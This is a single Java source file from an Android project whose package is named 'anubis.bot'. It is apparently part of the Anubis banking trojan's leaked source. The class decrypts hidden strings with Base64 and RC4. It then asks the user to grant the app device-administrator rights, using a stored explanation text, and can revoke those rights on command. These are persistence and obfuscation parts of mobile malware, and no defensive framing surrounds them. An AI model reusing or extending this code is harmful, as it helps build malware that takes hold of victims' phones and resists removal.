package anubis.bot.myapplication.API.Admin;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Base64;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.R;
import anubis.bot.myapplication.Constants;
import anubis.bot.myapplication.UtilsClass;

public class ActivityAdmin extends Activity {

    private ClassAdmin PPM;
    Constants const_ = new Constants();

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    @Override
    protected void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
       // setContentView(R.layout.activity_go_adm);

        PPM = new ClassAdmin(this);
        Intent intent = getIntent();
        String str = intent.getStringExtra("str");

        if(str.equals("start")){
            Intent activateDeviceAdmin = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            activateDeviceAdmin.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, PPM.GAC());
            activateDeviceAdmin.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, const_.textadmin);
            startActivityForResult(activateDeviceAdmin, ClassAdmin.DMP);
        }else{
            ComponentName mAdminReceiver = new ComponentName(this, ReceiverDeviceAdmin.class);
            DevicePolicyManager mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            mDPM.removeActiveAdmin(mAdminReceiver);
        }
       finish();
    }
}
